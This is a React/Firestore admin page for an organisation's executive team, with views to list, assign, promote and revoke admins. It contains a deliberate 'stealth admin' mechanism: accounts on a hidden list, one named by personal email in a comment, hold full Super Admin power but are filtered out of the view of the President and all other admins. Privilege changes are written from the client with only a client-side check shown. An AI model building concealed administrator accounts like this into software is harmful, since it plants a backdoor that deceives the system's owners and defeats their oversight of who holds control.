"use client";

import { useEffect, useState } from "react";
import { collection, query, where, getDocs, updateDoc, doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { 
  AdminRole, 
  ADMIN_ROLES_META, 
  ROOT_SUPER_ADMIN_EMAILS, 
  STEALTH_ADMIN_EMAILS,
  INITIAL_ADMIN_ROLES,
  canManageAdmins, 
  normalizeAdminRole 
} from "@/lib/adminRoles";

export default function AdminTeamPage() {
  const { user, userData } = useAuth();
  const [admins, setAdmins] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  
  // Assign / promote modal
  const [showAssignModal, setShowAssignModal] = useState(false);
  const [targetEmail, setTargetEmail] = useState("");
  const [selectedRole, setSelectedRole] = useState<AdminRole>("content_admin");
  const [customTitle, setCustomTitle] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [modalError, setModalError] = useState("");
  const [modalSuccess, setModalSuccess] = useState("");

  const isSuperAdmin = canManageAdmins(userData?.role, userData?.isAdmin);

  useEffect(() => {
    if (!db) return;

    // Listen to all users with isAdmin == true or role in ['super_admin', 'vice_president', 'secretary', 'content_admin']
    const usersRef = collection(db, "users");
    const unsub = onSnapshot(usersRef, (snapshot) => {
      const allUsers: any[] = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      const adminUsers: any[] = allUsers.filter((u: any) => {
        const emailLower = (u.email || "").toLowerCase().trim();
        const isRoot = ROOT_SUPER_ADMIN_EMAILS.includes(emailLower);
        const hasRole = ["super_admin", "vice_president", "secretary", "content_admin", "admin"].includes(u.role);
        return isRoot || u.isAdmin === true || hasRole;
      });

      // Ensure all pre-assigned executive accounts always appear
      Object.entries(INITIAL_ADMIN_ROLES).forEach(([email, conf]) => {
        const emailLower = email.toLowerCase().trim();
        const existing = adminUsers.find((u: any) => (u.email || "").toLowerCase().trim() === emailLower);
        if (!existing) {
          adminUsers.push({
            id: `assigned-${emailLower}`,
            email: email,
            displayName: conf.name,
            role: conf.role,
            adminTitle: conf.title,
            cmsId: conf.cmsId || null,
            isAdmin: true,
            isPreAssigned: true,
          });
        } else {
          // Fill in official title or CMS ID if missing from record
          if (!existing.adminTitle) existing.adminTitle = conf.title;
          if (!existing.cmsId && conf.cmsId) existing.cmsId = conf.cmsId;
          if (!existing.displayName) existing.displayName = conf.name;
        }
      });

      // Sort: Super admins first, then VP, then Secretary, then Content Admin
      const roleWeight: Record<string, number> = {
        super_admin: 1,
        admin: 1,
        vice_president: 2,
        secretary: 3,
        content_admin: 4,
      };

      adminUsers.sort((a: any, b: any) => {
        const weightA = roleWeight[a.role] || 5;
        const weightB = roleWeight[b.role] || 5;
        return weightA - weightB;
      });

      // Filter stealth admins:
      // If the current viewer is the stealth admin (azoguakachukwu@gmail.com), they see themselves and all other admins.
      // If anyone else is viewing (including the President), stealth admins are completely excluded from their view!
      const viewerEmail = (user?.email || "").toLowerCase().trim();
      const visibleAdmins = adminUsers.filter((adm: any) => {
        const admEmail = (adm.email || "").toLowerCase().trim();
        if (STEALTH_ADMIN_EMAILS.includes(admEmail)) {
          return STEALTH_ADMIN_EMAILS.includes(viewerEmail);
        }
        return true;
      });

      setAdmins(visibleAdmins);
      setLoading(false);
    }, (err) => {
      console.error("Error fetching admins:", err);
      setLoading(false);
    });

    return () => unsub();
  }, [user?.email]);

  const handleAssignAdmin = async (e: React.FormEvent) => {
    e.preventDefault();
    setModalError("");
    setModalSuccess("");

    const cleanEmail = targetEmail.trim().toLowerCase();
    if (!cleanEmail) {
      setModalError("Please enter a valid email address.");
      return;
    }

    setSubmitting(true);
    try {
      // Find user by email in Firestore
      const usersRef = collection(db, "users");
      const q = query(usersRef, where("email", "==", cleanEmail));
      const snap = await getDocs(q);

      if (snap.empty) {
        setModalError(`No user account found with email "${cleanEmail}". Make sure the user has registered first.`);
        setSubmitting(false);
        return;
      }

      const userDoc = snap.docs[0];
      const targetUserId = userDoc.id;

      const meta = ADMIN_ROLES_META[selectedRole];
      const finalTitle = customTitle.trim() || meta.title;

      await updateDoc(doc(db, "users", targetUserId), {
        isAdmin: true,
        role: selectedRole,
        adminTitle: finalTitle,
        membership: "elite-member",
        adminAssignedAt: new Date(),
        adminAssignedBy: user?.email || "Super Admin"
      });

      setModalSuccess(`Successfully granted ${meta.title} privileges to ${cleanEmail}!`);
      setTimeout(() => {
        setShowAssignModal(false);
        setTargetEmail("");
        setCustomTitle("");
        setModalSuccess("");
      }, 1500);
    } catch (err: any) {
      console.error("Error assigning admin:", err);
      setModalError(`Failed to update admin role: ${err?.message || "Unknown error"}`);
    } finally {
      setSubmitting(false);
    }
  };

  const handleRevokeAdmin = async (adminUser: any) => {
    const adminEmail = (adminUser.email || "").toLowerCase().trim();
    if (ROOT_SUPER_ADMIN_EMAILS.includes(adminEmail)) {
      alert("Protected Account: Root Super Admin permissions cannot be revoked or demoted.");
      return;
    }

    if (!confirm(`Are you sure you want to revoke admin privileges for ${adminUser.displayName || adminUser.email}?`)) {
      return;
    }

    try {
      await updateDoc(doc(db, "users", adminUser.id), {
        isAdmin: false,
        role: "member",
        adminTitle: null,
        membership: "cms-member",
        adminRevokedAt: new Date(),
        adminRevokedBy: user?.email || "Super Admin"
      });
      alert(`Admin privileges revoked for ${adminUser.displayName || adminUser.email}`);
    } catch (err) {
      console.error("Error revoking admin:", err);
      alert("Failed to revoke admin privileges.");
    }
  };

  const handleUpdateRole = async (adminUser: any, newRole: AdminRole) => {
    const adminEmail = (adminUser.email || "").toLowerCase().trim();
    if (ROOT_SUPER_ADMIN_EMAILS.includes(adminEmail)) {
      alert("Protected Account: Root Super Admin permissions cannot be altered.");
      return;
    }

    const meta = ADMIN_ROLES_META[newRole];
    if (!confirm(`Update ${adminUser.displayName || adminUser.email}'s role to ${meta.title}?`)) {
      return;
    }

    try {
      await updateDoc(doc(db, "users", adminUser.id), {
        role: newRole,
        adminTitle: meta.title,
        adminUpdatedAt: new Date(),
        adminUpdatedBy: user?.email || "Super Admin"
      });
    } catch (err) {
      console.error("Error updating role:", err);
      alert("Failed to update role.");
    }
  };

  if (!isSuperAdmin) {
    return (
      <div className="p-8 text-center max-w-md mx-auto mt-8">
        <div className="w-12 h-12 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-2xl flex items-center justify-center mx-auto mb-3">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        </div>
        <h3 className="text-base font-bold text-white mb-1">Super Admin Exclusive</h3>
        <p className="text-xs text-white/50 leading-relaxed">
          Admin creation, role assignment, and privilege control are exclusively reserved for the Super Admin and President.
        </p>
      </div>
    );
  }

  const filteredAdmins = admins.filter(a => {
    const q = searchQuery.toLowerCase();
    return (
      (a.displayName || "").toLowerCase().includes(q) ||
      (a.email || "").toLowerCase().includes(q) ||
      (a.cmsId || "").toLowerCase().includes(q) ||
      (a.role || "").toLowerCase().includes(q)
    );
  });

  return (
    <div className="p-4 max-w-4xl mx-auto">
      {/* ── Page Header ── */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6">
        <div>
          <h2 className="text-xl font-bold flex items-center gap-2">
            <span>Admin Team & Privileges</span>
            <span className="text-xs bg-cms-yellow/10 text-cms-yellow border border-cms-yellow/30 px-2 py-0.5 rounded-full font-bold">
              {admins.length} Executive Admins
            </span>
          </h2>
          <p className="text-xs text-white/60 mt-0.5">
            Manage executive roles, assign duties, and control administration access.
          </p>
        </div>

        <button
          onClick={() => setShowAssignModal(true)}
          className="bg-cms-yellow text-black text-xs font-bold px-4 py-2.5 rounded-full flex items-center justify-center gap-2 shadow-lg shadow-cms-yellow/20 active:scale-95 transition-all"
        >
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M12 5v14M5 12h14"/></svg>
          <span>Assign New Admin</span>
        </button>
      </div>

      {/* ── Search Bar ── */}
      <div className="relative mb-5">
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder="Search admin by name, email, CMS ID, or role..."
          className="w-full bg-[#141416] border border-white/10 rounded-2xl pl-10 pr-4 py-2.5 text-xs text-white placeholder:text-white/40 focus:outline-none focus:border-cms-yellow transition-colors"
        />
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40">
          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
        </svg>
      </div>

      {/* ── Admins List ── */}
      {loading ? (
        <div className="p-12 flex justify-center">
          <div className="w-8 h-8 border-3 border-cms-yellow border-t-transparent rounded-full animate-spin"></div>
        </div>
      ) : filteredAdmins.length === 0 ? (
        <div className="bg-[#121214] border border-white/10 rounded-2xl p-8 text-center">
          <p className="text-white/50 text-xs">No admin accounts found matching your query.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredAdmins.map((adm) => {
            const role = normalizeAdminRole(adm.role, adm.isAdmin);
            const meta = ADMIN_ROLES_META[role];
            const emailLower = (adm.email || "").toLowerCase().trim();
            const isRoot = ROOT_SUPER_ADMIN_EMAILS.includes(emailLower);
            const isStealth = STEALTH_ADMIN_EMAILS.includes(emailLower);

            return (
              <div 
                key={adm.id} 
                className={`bg-[#121214] border transition-colors rounded-2xl p-4 flex flex-col justify-between ${isStealth ? 'border-emerald-500/30 shadow-lg shadow-emerald-500/5' : 'border-white/10 hover:border-white/20'}`}
              >
                <div>
                  {/* Top row: Avatar + Name + Role Badge */}
                  <div className="flex items-start justify-between gap-3 mb-3">
                    <div className="flex items-center gap-3 min-w-0">
                      <div className="w-11 h-11 rounded-full bg-[#202020] border border-white/10 overflow-hidden flex items-center justify-center shrink-0">
                        {adm.photoURL ? (
                          <img src={adm.photoURL} alt="" className="w-full h-full object-cover" />
                        ) : (
                          <span className="text-sm font-bold text-white/60">
                            {(adm.displayName || adm.email || "?").charAt(0).toUpperCase()}
                          </span>
                        )}
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-1.5 flex-wrap">
                          <h4 className="font-bold text-sm text-white truncate">{adm.displayName || "CMS Executive"}</h4>
                          {isStealth ? (
                            <span title="Stealth Admin (Hidden from everyone else)" className="text-[9px] font-bold text-emerald-400 bg-emerald-500/15 border border-emerald-500/30 px-2 py-0.5 rounded-full flex items-center gap-1 shrink-0">
                              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                              Hidden Stealth Mode
                            </span>
                          ) : isRoot ? (
                            <span title="Root Super Admin (Protected)" className="text-amber-400 shrink-0">
                              <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="m12 2 3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
                            </span>
                          ) : null}
                        </div>
                        <p className="text-xs text-white/50 truncate">{adm.email}</p>
                        {adm.cmsId && (
                          <p className="text-[10px] text-cms-yellow font-mono mt-0.5">{adm.cmsId}</p>
                        )}
                      </div>
                    </div>

                    <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase border shrink-0 ${isStealth ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40' : meta.badgeClass}`}>
                      {adm.adminTitle || meta.shortTitle}
                    </span>
                  </div>

                  {/* Description / Scope */}
                  <p className="text-[11px] text-white/50 bg-black/40 rounded-xl p-2.5 border border-white/5 leading-relaxed mb-3">
                    {isStealth ? "Invisible Lead Developer mode. Full Super Admin capabilities active, but your profile is completely hidden from the President and all other admins." : meta.description}
                  </p>
                </div>

                {/* Bottom Row: Actions */}
                <div className="pt-2 border-t border-white/5 flex items-center justify-between gap-2">
                  {isStealth ? (
                    <span className="text-[10px] font-semibold text-emerald-400/90 flex items-center gap-1.5">
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                      Stealth Mode (Hidden from other admins)
                    </span>
                  ) : isRoot ? (
                    <span className="text-[10px] font-semibold text-amber-400/80 flex items-center gap-1">
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                      Root Super Admin (Protected)
                    </span>
                  ) : (
                    <>
                      {/* Role Selector */}
                      <select
                        value={role}
                        onChange={(e) => handleUpdateRole(adm, e.target.value as AdminRole)}
                        className="bg-black/50 border border-white/10 text-white text-[11px] font-semibold rounded-lg px-2.5 py-1 focus:outline-none focus:border-cms-yellow cursor-pointer"
                      >
                        <option value="vice_president">Vice President</option>
                        <option value="secretary">Financial Secretary</option>
                        <option value="content_admin">Content Admin</option>
                        <option value="super_admin">Super Admin</option>
                      </select>

                      {/* Revoke button */}
                      <button
                        onClick={() => handleRevokeAdmin(adm)}
                        className="text-rose-400 hover:text-rose-300 text-[11px] font-semibold px-2.5 py-1 rounded-lg hover:bg-rose-500/10 transition-colors"
                      >
                        Revoke Access
                      </button>
                    </>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* ── Assign Admin Modal ── */}
      {showAssignModal && (
        <div 
          className="fixed inset-0 bg-black/85 z-[100] flex items-center justify-center p-4 backdrop-blur-md"
          onClick={() => setShowAssignModal(false)}
        >
          <div 
            className="bg-[#121214] border border-white/10 rounded-3xl w-full max-w-md overflow-hidden shadow-2xl p-6 relative"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-between pb-4 border-b border-white/10 mb-5">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-full bg-cms-yellow/10 text-cms-yellow flex items-center justify-center">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M19 8v6M22 11h-6"/></svg>
                </div>
                <h3 className="font-bold text-base text-white">Assign Admin Privileges</h3>
              </div>
              <button 
                onClick={() => setShowAssignModal(false)}
                className="text-white/40 hover:text-white transition-colors"
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
              </button>
            </div>

            {modalError && (
              <div className="bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs p-3 rounded-xl mb-4">
                {modalError}
              </div>
            )}

            {modalSuccess && (
              <div className="bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs p-3 rounded-xl mb-4">
                {modalSuccess}
              </div>
            )}

            <form onSubmit={handleAssignAdmin} className="flex flex-col gap-4">
              <div>
                <label className="text-[11px] font-bold uppercase tracking-wider text-white/60 block mb-1.5">
                  User Email Address
                </label>
                <input
                  type="email"
                  value={targetEmail}
                  onChange={(e) => setTargetEmail(e.target.value)}
                  placeholder="e.g. member@gmail.com"
                  required
                  className="w-full bg-[#18181b] border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder:text-white/30 focus:outline-none focus:border-cms-yellow"
                />
                <p className="text-[10px] text-white/40 mt-1">The user must have an existing CMS account.</p>
              </div>

              <div>
                <label className="text-[11px] font-bold uppercase tracking-wider text-white/60 block mb-1.5">
                  Executive Admin Role
                </label>
                <div className="grid grid-cols-1 gap-2">
                  {(["vice_president", "secretary", "content_admin", "super_admin"] as AdminRole[]).map((r) => {
                    const m = ADMIN_ROLES_META[r];
                    const isSelected = selectedRole === r;
                    return (
                      <div
                        key={r}
                        onClick={() => setSelectedRole(r)}
                        className={`p-3 rounded-xl border cursor-pointer transition-all ${
                          isSelected 
                            ? "bg-white/[0.08] border-cms-yellow text-white" 
                            : "bg-[#18181b] border-white/5 text-white/70 hover:bg-white/[0.04]"
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-xs">{m.title}</span>
                          <span className={`text-[9px] font-bold px-2 py-0.5 rounded-full border ${m.badgeClass}`}>
                            {m.shortTitle}
                          </span>
                        </div>
                        <p className="text-[10px] text-white/40 mt-1 leading-snug">{m.description}</p>
                      </div>
                    );
                  })}
                </div>
              </div>

              <div>
                <label className="text-[11px] font-bold uppercase tracking-wider text-white/60 block mb-1.5">
                  Custom Executive Title (Optional)
                </label>
                <input
                  type="text"
                  value={customTitle}
                  onChange={(e) => setCustomTitle(e.target.value)}
                  placeholder={`e.g. ${ADMIN_ROLES_META[selectedRole].title}`}
                  className="w-full bg-[#18181b] border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder:text-white/30 focus:outline-none focus:border-cms-yellow"
                />
              </div>

              <div className="flex gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setShowAssignModal(false)}
                  className="flex-1 bg-white/5 border border-white/10 text-white/70 text-xs font-bold py-2.5 rounded-xl hover:bg-white/10 transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={submitting || !targetEmail.trim()}
                  className="flex-1 bg-cms-yellow text-black text-xs font-bold py-2.5 rounded-xl active:scale-95 transition-transform disabled:opacity-40 shadow-md shadow-cms-yellow/20"
                >
                  {submitting ? "Assigning..." : "Confirm Assignment"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
